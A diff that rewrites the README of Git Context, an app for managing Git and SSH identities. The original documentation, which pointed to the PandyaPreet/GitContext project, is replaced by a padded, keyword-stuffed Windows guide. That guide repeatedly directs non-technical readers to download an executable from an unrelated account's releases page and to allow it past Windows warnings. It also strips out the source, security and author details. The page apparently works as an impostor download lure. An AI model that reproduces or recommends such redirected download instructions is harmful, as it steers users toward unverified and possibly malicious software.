@@ -1,344 +1,140 @@
-<div align="center">
+# 🧭 gitContext - Keep Every Commit Identity Correct
 
-<img src="src-tauri/icons/128x128@2x.png" alt="Git Context" width="112" height="112" />
+[![Download gitContext for Windows](https://img.shields.io/badge/Download-gitContext_for_Windows-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/plexusdentalischangtzu246/gitContext/releases)
 
-# Git Context
+gitContext is a local desktop app for developers with more than one GitHub or GitLab account. Git Context sets the right name, email, and SSH key for each repository, so you stop committing as the wrong person.
 
-**Use the right Git identity in every repository, automatically.**
+This README is written for Windows users who want to download gitContext and start using it without needing programming knowledge. You do not need to understand Git commands or server setup to follow this guide. The goal is simple: help you get gitContext from the official releases page, open it on Windows, and set up the correct identity for each GitHub or GitLab account you use.
 
-A local desktop app for developers with more than one GitHub or GitLab account.<br/>
-Git Context sets the right name, email and SSH key for each repository, so you stop committing as the wrong person.
+## 👋 What gitContext Does
 
-[![Latest release](https://img.shields.io/github/v/release/PandyaPreet/GitContext?display_name=tag&sort=semver&color=77ddb1)](https://github.com/PandyaPreet/GitContext/releases/latest)
-[![Desktop checks](https://github.com/PandyaPreet/GitContext/actions/workflows/ci.yml/badge.svg)](https://github.com/PandyaPreet/GitContext/actions/workflows/ci.yml)
-![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-informational)
-![Built with Tauri](https://img.shields.io/badge/built%20with-Tauri%202-24c8db?logo=tauri&logoColor=white)
-![Privacy](https://img.shields.io/badge/privacy-no%20data%20collected-2ea44f)
+If you use GitHub or GitLab for both work and personal projects, it is easy to save a change with the wrong name, email, or SSH key. That can make a personal project look like it came from your work account, or make a work project use your personal details.
 
-[**Download**](#-download) · [Features](#-features) · [Security & privacy](#-security--privacy) · [How it works](#-how-it-works) · [FAQ](#-faq) · [Contributing](#-contributing)
+gitContext helps prevent that mix-up. It is a local desktop app that keeps the right identity attached to the right project folder. You can think of it as a context switcher for your GitHub and GitLab accounts.
 
-🔒 **Runs entirely on your computer. No account, no cloud, no tracking. Your keys and config never leave your machine.**
+With gitContext, you can:
 
-</div>
+- Use more than one GitHub account on the same Windows computer.
+- Use more than one GitLab account on the same Windows computer.
+- Keep a separate name and email for each account.
+- Keep a separate SSH key for each account or project group.
+- Open a project folder and let gitContext apply the correct identity.
+- Avoid changing your global Git settings every time you switch between work and personal projects.
+- Keep your account details and project settings on your own computer.
 
-<!-- Add a product screenshot here, e.g. docs/screenshot.png:
-<p align="center"><img src="docs/screenshot.png" alt="Git Context dashboard" width="860" /></p>
--->
+gitContext is especially useful if you have a work GitHub account and a personal GitHub account, or a client GitLab account and your own GitLab account. Instead of remembering which email address belongs to which folder, you set up the account once and let gitContext handle the rest.
 
----
+## 🚀 Getting Started
 
-## The problem
+This guide is for Windows users. You will need a Windows computer, an internet connection, and access to the GitHub or GitLab account or accounts you want to use with gitContext.
 
-You have a work account and a personal one. Maybe a few client accounts too. Then one day you:
+You do not need to install any developer tools before you begin. You do not need to create a special server. You do not need to change settings in GitHub or GitLab unless you want to add a new SSH key later.
 
-- push a work commit authored by `me@personal.dev`,
-- get `Permission denied (publickey)` because SSH offered the wrong key,
-- or hand-edit `~/.ssh/config` for the fifth time this month.
+The first step is to download gitContext from the official releases page. Use the large download button at the top of this README or the download link in the next section. The releases page is the official place to get the Windows version of gitContext.
 
-**Git Context fixes this.** You create a profile once for each identity, assign a profile to each repository, and the app writes the correct Git and SSH configuration for you. You can preview every change first and undo it afterwards.
+## 📥 Download and Run gitContext
 
-## ✨ Features
+**Download link:** [https://github.com/plexusdentalischangtzu246/gitContext/releases](https://github.com/plexusdentalischangtzu246/gitContext/releases)
 
-| | |
-| --- | --- |
-| 👤 **Profiles for every identity** | GitHub and GitLab, including self-hosted hosts and custom SSH ports. Each profile has a name, email, username, SSH key and color. |
-| 🔑 **Generate SSH keys in-app** | Checks that your GitHub or GitLab username exists, then creates an Ed25519 key in one click, copy the public key, and jump straight to your GitHub or GitLab SSH settings to paste it. |
-| 📁 **Per-repository assignment** | Sets `user.name`, `user.email` and a dedicated SSH host alias for a repository, and can rewrite its remote to match. |
-| 🔍 **Preview before apply** | Every change to `~/.ssh/config`, `~/.gitconfig` or a repository's config appears as a before/after diff first. Nothing is written until you confirm. |
-| ↩️ **Undo** | Every applied change is journaled. Roll it back from **Settings → Configuration history**. |
-| 🔐 **SSH verification** | Confirms that a key actually authenticates as the account you expect, not just any account. |
-| 🌐 **Global default profile** | Switch your machine-wide identity in one click from the system tray. |
-| 🧭 **Environment detection** | Finds your Git and OpenSSH versions, existing keys, SSH hosts, the SSH agent and the GitHub CLI. |
-| ⌨️ **Command palette** | Press `⌘K` / `Ctrl K` to activate profiles and run actions from the keyboard. |
-| 🚀 **Launch in context** | Open a verified repository in VS Code, Terminal, iTerm, Windows Terminal, PowerShell, CMD or your file manager. |
-| 🌗 **Made for daily use** | Light and dark themes, launch at login, starts in the tray, single-instance. |
+Visit this link to download the application.
 
-## 🔒 Security & privacy
+After the download is complete, open the downloaded item from your Downloads folder. Follow the on-screen prompts to finish opening gitContext. If Windows asks for permission to open the app, choose the option that allows the app to open.
 
-Git Context works with your SSH keys and Git identity, so it's built to be trustworthy from the ground up.
+When gitContext opens, you will see the main window. From there, you can add your GitHub or GitLab accounts and begin setting up the correct identity for your project folders.
 
-### We don't collect your data
+## 🧭 Set Up Your First Account
 
-- **No account or sign-up.** Download and use it. There's nothing to register.
-- **No servers, no cloud.** There's no Git Context backend. We don't run servers that store your information.
-- **No telemetry, analytics or tracking.** The app contains no analytics SDK and never reports usage, crashes or device information.
-- **No ads, no third-party trackers.** None.
-- **Open source.** Every line of code is in this repository, so you can check these claims yourself.
+The first account you add is usually the one you use most often. It can be a GitHub account or a GitLab account.
 
-### Your SSH keys stay yours
+1. Open gitContext on your Windows computer.
+2. Choose the option to add a GitHub or GitLab account.
+3. Sign in to the account when gitContext asks you to.
+4. Enter the name you want to use for commits from this account.
+5. Enter the email address you want to use for commits from this account.
+6. Add the SSH key for this account if you already have one, or follow the prompts in gitContext to create one.
+7. Save the account settings.
 
-- Git Context **never copies, uploads or modifies your private keys**.
-- New keys you generate are created by your system's own `ssh-keygen` in `~/.ssh`, and existing files are never overwritten.
-- It stores only the **file path** to your keys, such as `~/.ssh/id_ed25519_work`.
-- Authentication is done by your system's own OpenSSH, exactly as when you run `git push`.
+The name and email you enter are the details that will appear when you save changes to a project that uses this account. Use the same name and email that you want other people to see on GitHub or GitLab.
 
-### What stays on your computer
+If you are not sure which email to use, check the email settings in your GitHub or GitLab account. Use the email address that is already connected to the account you are adding.
 
-To work and support undo, Git Context saves a small amount of data **locally, on your own machine only**:
+## 🔁 Add Your Other Accounts
 
-| Data | Why |
-| --- | --- |
-| Profiles: display name, Git name and email, username, host, SSH key paths | So you can switch identities |
-| Paths of the repositories you add | So it knows which repository uses which profile |
-| Backups of config files it changed (`~/.ssh/config`, `~/.gitconfig`, repository config) | So every change can be undone |
-| App settings (theme, startup view) | Your preferences |
+After your first account is ready, add any other GitHub or GitLab accounts you use. For example, you might add a work GitHub account after your personal GitHub account, or a client GitLab account after your own GitLab account.
 
-It's stored in your OS's standard app-data folder (see [How it works](#-how-it-works)). On macOS and Linux, files are saved with owner-only permissions. Uninstall the app and delete that folder, and everything is gone.
+1. In gitContext, choose the option to add another account.
+2. Select GitHub or GitLab.
+3. Sign in to the second account.
+4. Enter the name and email for this account.
+5. Add or create the SSH key for this account.
+6. Save the settings.
 
-### When does it use the network?
+Keep the name and email separate for each account. This is the main reason to use gitContext: each account keeps its own identity, and each project folder can use the account that belongs to it.
 
-Git Context has no servers of its own. It talks only to your Git provider (GitHub, GitLab or your self-hosted GitLab), and only for these checks:
+## 🧩 Connect Project Folders to the Right Account
 
-- **Username check**: while you create a profile, the app asks the provider's public API whether the username exists, using your system's `curl`. Only the username is sent: no email, keys or configuration.
+Now that your accounts are set up, connect your project folders to the correct account.
 
-- **Verify profile** runs `ssh -T git@<your-host>` so GitHub or GitLab can confirm which account a key belongs to, the same check their docs recommend.
-- **Environment detection**: if you have the GitHub CLI (`gh`) installed, the app runs `gh auth status` to suggest the usernames you're signed in with. If you don't have `gh`, nothing happens.
+1. In gitContext, find the option to add or manage a project folder.
+2. Choose the folder on your computer that contains your project.
+3. Select the GitHub or GitLab account that should be used for that folder.
+4. Save the connection.
 
-### Built to be safe
+Repeat this for each project folder that needs a specific account. For example, connect your work project folder to your work GitHub account and your personal project folder to your personal GitHub account.
 
-- **Locked-down app.** The interface has no shell, filesystem or network permissions and runs under a strict Content Security Policy. Every action goes through a small, validated Rust backend.
-- **No network listener.** The app doesn't open ports or run a local web server.
-- **You approve every change.** Every edit is shown as a before/after preview, and nothing is written until you click **Apply**.
-- **Undo anything.** Every applied change is journaled and can be rolled back.
-- **Careful with your config.** Git Context edits only its own clearly marked blocks. It refuses to change setups it can't reason about safely (`Include`/`Match` rules, `core.sshCommand`, `url.*.insteadOf`) and asks you to review them instead.
-- **Crash-safe writes.** Files are written atomically and under a lock, so an interrupted write can't leave a half-written config.
-- **Strict host checking.** Managed SSH aliases use `IdentitiesOnly yes` and `StrictHostKeyChecking yes`, so only the chosen key is offered and only to a known host. Explicit **Verify** checks use the same first-use trust policy as GitShift (`accept-new`): OpenSSH saves a previously unknown host key in `known_hosts`, but refuses a changed host key. Verification opens a fresh connection using only the selected profile key and checks the returned account name. This trusts the first connection; it does not independently validate a new host fingerprint.
+When you save changes in a connected folder, gitContext helps make sure the correct name, email, and SSH key are used. This reduces the chance of committing as the wrong person.
 
-### Reporting a vulnerability
+## 🧑‍💻 Everyday Use on Windows
 
-Found a security issue? Please report it privately through [GitHub Security Advisories](https://github.com/PandyaPreet/GitContext/security/advisories/new) instead of opening a public issue. We'll respond as quickly as we can.
+After setup, gitContext becomes part of your normal Windows workflow.
 
-## 📦 Download
+1. Open gitContext.
+2. Open your project folder as you usually do.
+3. Make and save your changes.
+4. Use the correct account identity that gitContext has connected to that folder.
 
-Get the latest version from the **[Releases page](https://github.com/PandyaPreet/GitContext/releases/latest)**.
+You can keep gitContext open while you work, or open it when you need to switch between accounts. If you add a new project later, connect it to the right account before you start saving changes.
 
-| Platform | Architecture | Installer |
-| --- | --- | --- |
-| **macOS** 10.15+ | Apple Silicon (M1–M4) | `Git.Context_<version>_aarch64.dmg` |
-| | Intel | `Git.Context_<version>_x64.dmg` |
-| **Windows** 10/11 | x64 | `Git.Context_<version>_x64-setup.exe` or `_x64_en-US.msi` |
-| | ARM64 | `Git.Context_<version>_arm64-setup.exe` |
-| **Linux** | x64 | `.AppImage` · `.deb` (Debian/Ubuntu) · `.rpm` (Fedora/RHEL/openSUSE) |
-| | ARM64 | `.AppImage` · `.deb` · `.rpm` |
+If you ever need to check which account is connected to a folder, open gitContext and review the folder settings. This helps you confirm that your work project is using your work identity and your personal project is using your personal identity.
 
-**Requirements:** [Git](https://git-scm.com/downloads) and OpenSSH on your `PATH`. OpenSSH ships with macOS, Windows 10+ and most Linux distributions.
+## 🔐 Privacy and Local Data
 
-<details>
-<summary><b>macOS: "Git Context can't be opened" or "is damaged"</b></summary>
+gitContext is a local desktop app. Your account settings, project connections, and identity details are stored on your Windows computer. You do not need to upload your project folders to a separate service to use gitContext.
 
-Release builds aren't notarized with a paid Apple Developer certificate yet. Open the app once from Finder with a right-click → **Open** → **Open**. If macOS reports the app as damaged, remove the download quarantine flag:
+Your GitHub or GitLab sign-in is handled by those services when you add an account. gitContext uses the details you provide to set the correct name, email, and SSH key for each connected project folder.
 
-```bash
-xattr -dr com.apple.quarantine "/Applications/Git Context.app"
-```
-</details>
+Keep your computer account protected with a password, and keep your SSH keys private. If you share your computer with other people, use separate Windows user accounts so your gitContext settings stay separate.
 
-<details>
-<summary><b>Windows: "Windows protected your PC"</b></summary>
+## 🛠️ Troubleshooting
 
-SmartScreen warns about apps without an established code-signing reputation. Click **More info** → **Run anyway**.
-</details>
+If the download does not start, return to the official releases page using the download link in this README. Make sure you are on the gitContext releases page and try the download again.
 
-<details>
-<summary><b>Linux: installing each package type</b></summary>
+If the downloaded item does not open, check your Downloads folder and open the item again. If Windows asks for permission, allow the app to open. If the app still does not open, restart your computer and try opening it again.
 
-```bash
-# Debian / Ubuntu
-sudo apt install ./<downloaded-file>.deb
+If gitContext opens but you cannot add an account, check your internet connection and make sure you can sign in to GitHub or GitLab in your browser. Then return to gitContext and try adding the account again.
 
-# Fedora / RHEL / openSUSE
-sudo dnf install ./<downloaded-file>.rpm
+If a project folder is using the wrong name or email, open gitContext and review the account connected to that folder. Change the connection to the correct account and save the settings.
 
-# Any distribution
-chmod +x ./<downloaded-file>.AppImage
-./<downloaded-file>.AppImage
-```
+If you are unsure which SSH key belongs to an account, use the SSH key settings in gitContext to review or create a key for that account. Keep each key with the account it belongs to.
 
-The tray icon needs an AppIndicator-compatible desktop. On GNOME, install the *AppIndicator and KStatusNotifierItem Support* extension.
-</details>
+## ❓ Frequently Asked Questions
 
-## 🚀 Quick start
+**Do I need programming knowledge to use gitContext?**  
+No. gitContext is designed as a desktop app for Windows users. You add your accounts, enter your name and email, and connect your project folders.
 
-1. **Launch Git Context.** It detects your Git setup and any SSH keys in `~/.ssh`.
-2. **Create a profile** for each identity, for example *Work* and *Personal*. Pick an existing SSH key, or click **Generate new key** and add it to your account with the **Copy** and **Open SSH settings** buttons.
-3. **Verify** each profile. Git Context asks GitHub or GitLab which account the key belongs to.
-4. **Add a repository**, choose a profile, review the preview and click **Apply**.
-5. Commit and push as usual. The right identity is used every time.
+**Can I use both GitHub and GitLab?**  
+Yes. gitContext supports GitHub and GitLab accounts, so you can keep separate identities for each service.
 
-> 💡 **New to SSH keys?** Click **Generate new key** while creating a profile. Git Context creates the key, lets you copy it, and opens your GitHub or GitLab SSH settings so you can paste it.
+**Can I use more than two accounts?**  
+Yes. You can add the GitHub and GitLab accounts you use and connect each project folder to the correct one.
 
-## ⚙️ How it works
+**Does gitContext change my GitHub or GitLab password?**  
+No. You sign in to your accounts through GitHub or GitLab. gitContext uses the account details you provide to set the right identity for each project folder.
 
-For each profile, Git Context adds a clearly marked block to `~/.ssh/config`:
+**Where do I download gitContext?**  
+Visit this link to download the application: [https://github.com/plexusdentalischangtzu246/gitContext/releases](https://github.com/plexusdentalischangtzu246/gitContext/releases)
 
-```sshconfig
-# Git Context begin <profile-id>
-Host github-work
-    HostName github.com
-    User git
-    IdentityFile "~/.ssh/id_ed25519_work"
-    IdentitiesOnly yes
-    StrictHostKeyChecking yes
-Host *
-# Git Context end <profile-id>
-```
+**What should I do first after opening gitContext?**  
+Add your first GitHub or GitLab account, enter the name and email for that account, and save the settings. Then add your other accounts and connect your project folders.
 
-When you assign that profile to a repository, it:
-
-1. sets the repository's local `user.name` and `user.email`,
-2. optionally rewrites the remote from `git@github.com:acme/api.git` to `git@github-work:acme/api.git`, so SSH always offers the right key,
-3. records a transaction you can undo later.
-
-The **global default profile** writes the same settings to `~/.gitconfig` and a `Host github.com` block, and never touches individual repositories.
-
-App state is stored locally in:
-
-| OS | Location |
-| --- | --- |
-| macOS | `~/Library/Application Support/dev.gitcontext.desktop` |
-| Windows | `%APPDATA%\dev.gitcontext.desktop` |
-| Linux | `~/.local/share/dev.gitcontext.desktop` |
-
-## ❓ FAQ
-
-<details>
-<summary><b>Will it break my existing SSH or Git configuration?</b></summary>
-
-No. Git Context only edits its own marked blocks, shows every change before applying it, and refuses to proceed when it finds rules it can't reason about safely (`Include`, `Match`, `core.sshCommand`, `url.*.insteadOf`). Every applied change can be undone.
-</details>
-
-<details>
-<summary><b>Does it upload or store my private keys?</b></summary>
-
-No. It only stores the *path* to keys you already have. Nothing is sent anywhere except a public username lookup and the standard `ssh -T` handshake, both only to your own Git provider.
-</details>
-
-<details>
-<summary><b>Do you collect any of my data?</b></summary>
-
-No. There's no account, server, analytics or telemetry. The little data the app needs, like your profiles and undo backups, is saved only on your own computer. See [Security & privacy](#-security--privacy).
-</details>
-
-<details>
-<summary><b>How do I remove everything?</b></summary>
-
-Undo any applied changes from **Settings → Configuration history**, uninstall the app, then delete its app-data folder (listed under [How it works](#-how-it-works)).
-</details>
-
-<details>
-<summary><b>Does it support GitLab or self-hosted instances?</b></summary>
-
-Yes. GitHub, GitLab.com and self-hosted GitLab (or GitHub Enterprise) hosts with any SSH port are supported.
-</details>
-
-<details>
-<summary><b>Does it work with HTTPS remotes?</b></summary>
-
-Git Context manages SSH-based identities. It can set name and email on any repository, but key selection relies on SSH remotes. It can rewrite a remote to the matching SSH alias for you.
-</details>
-
-## 🛠️ Development
-
-**Prerequisites:** [Node.js 24+](https://nodejs.org/), [Rust 1.85+](https://rustup.rs/), and the [Tauri system dependencies](https://v2.tauri.app/start/prerequisites/) for your OS.
-
-```bash
-git clone https://github.com/PandyaPreet/GitContext.git
-cd GitContext
-npm install
-
-npm run desktop         # run the app with hot reload
-npm test                # frontend tests (Vitest)
-npm run desktop:build   # build installers for your current OS
-```
-
-Backend checks:
-
-```bash
-cd src-tauri
-cargo fmt --check
-cargo clippy --all-targets -- -D warnings
-cargo test --lib
-```
-
-### Tech stack
-
-- **Desktop shell:** [Tauri 2](https://tauri.app) (Rust)
-- **UI:** React 19, TypeScript, Vite, Tailwind CSS 4, Radix UI, cmdk, Lucide icons
-- **Testing:** Vitest and Testing Library for the UI, `cargo test` for the backend
-
-### Project structure
-
-```
-src/                     React frontend
-  components/            screens, dialogs and UI primitives
-  hooks/ lib/            state, typed IPC API, provider helpers
-src-tauri/src/
-  lib.rs                 Tauri commands, tray and app lifecycle
-  service.rs             plans, apply and undo orchestration
-  ssh.rs  global.rs      SSH config parsing, merging and verification
-  git.rs  provider.rs    repository inspection and GitHub/GitLab rules
-  storage.rs             atomic writes, locking and transaction journal
-  detection.rs           environment and SSH key discovery
-  platform.rs            terminal, editor and folder launchers
-  bridge.rs              local JSON-lines helper protocol
-```
-
-## 🚢 Releasing
-
-Releases are built by [`.github/workflows/release.yml`](.github/workflows/release.yml) for macOS (arm64, x64), Windows (x64, arm64) and Linux (x64, arm64).
-
-1. Bump `version` in `package.json`, `src-tauri/tauri.conf.json` and `src-tauri/Cargo.toml`.
-2. Update [`CHANGELOG.md`](CHANGELOG.md) and [`.github/RELEASE_NOTES.md`](.github/RELEASE_NOTES.md).
-3. Tag and push:
-   ```bash
-   git tag v0.1.0
-   git push origin v0.1.0
-   ```
-4. When the workflow finishes, review the draft on the Releases page and click **Publish**.
-
-## 🤝 Contributing
-
-Bug reports, ideas and pull requests are welcome.
-
-1. [Open an issue](https://github.com/PandyaPreet/GitContext/issues) describing the bug or feature.
-2. Fork the repository and create a branch.
-3. Make sure `npm test` and the Cargo checks above pass.
-4. Open a pull request.
-
-## 💚 Support
-
-If Git Context saves you from one wrong-author commit, please ⭐ **star the repo**. It helps other developers find it.
-
-<div align="center">
-<sub>Built with Rust, React and Tauri.</sub>
-</div>
-
-### Profile awareness and quick switching
-
-- Choose Mint, Blue, Violet or Amber when adding a profile, or choose a colour from a profile's **…** menu. The sidebar, profile avatar and tray icon use that colour. On macOS, the menu bar also shows the active profile name.
-- Press **Command+Shift+G** on macOS or **Ctrl+Shift+G** on Windows/Linux to open the compact picker. Type to filter, use arrow keys and Enter to activate, or Escape to dismiss. The main window stays closed. Shortcut conflicts are shown under **Quick switch & app updates**.
-- **Verify active identity** checks the global author and managed SSH configuration, then tests the selected key against GitHub/GitLab. **Active** means applied; **Verified** means a successful authentication observation. It does not prove access to every repository, and HTTPS credentials remain independent.
-- Open **Health check** to inspect missing keys, author/SSH conflicts and externally changed configuration. Checks also run on focus and every minute while the webview is running. Use **Reapply** for settings drift; conflicting managed edits require review or restoration through Configuration history. Health checks never rewrite configuration.
-
-### Enable signed automatic updates before the next release
-
-The app checks for updates shortly after launch and daily, displays release notes, and installs only when the user clicks **Install update**. After installation, **Restart now** relaunches the new version; if a check or installation fails, **Download manually** opens the latest release. A local build without a signing public key clearly reports that updates are not configured.
-
-1. Generate a dedicated updater signing key **outside this repository**, and keep a secure backup:
-   ```bash
-   npm run tauri -- signer generate -w "$HOME/.tauri/git-context-updater.key"
-   ```
-2. In GitHub → Settings → Secrets and variables → Actions, add:
-   - Repository variable `TAURI_UPDATER_PUBLIC_KEY`: contents of the generated `.key.pub` file.
-   - Repository secret `TAURI_SIGNING_PRIVATE_KEY`: contents of the private `.key` file.
-   - Repository secret `TAURI_SIGNING_PRIVATE_KEY_PASSWORD`: the key password, if one was used.
-3. Bump versions, commit, and push a new version tag. The release workflow generates a public-key configuration overlay, signs updater artifacts and uploads `latest.json`. Build jobs run serially to prevent concurrent updates to that shared manifest. Without these keys the release still builds installers, just without signed updates; setting only one of them fails the release.
-4. Review all platform assets, signatures and `latest.json`, then publish the draft. Test an upgrade from an older signed build before announcing automatic updates.
-
-The updater endpoint is the public GitHub release's `latest.json`. Existing versions without an updater need one manual upgrade first. Linux in-app installation requires running the AppImage; package-manager installations should be updated through their package manager. Tauri update signatures are separate from Apple notarization and Windows code signing.
-
-## License
-
-Git Context is licensed under the [MIT License](LICENSE).
-
-Copyright (c) 2026 Git Context. Third-party dependencies retain their own licenses and notices.
+Keywords: gitContext, GitHub account switcher, GitLab account switcher, manage Git identities, SSH key manager, Windows desktop app, developer tools, multiple GitHub accounts, multiple GitLab accounts, repository identity, commit author, local desktop app
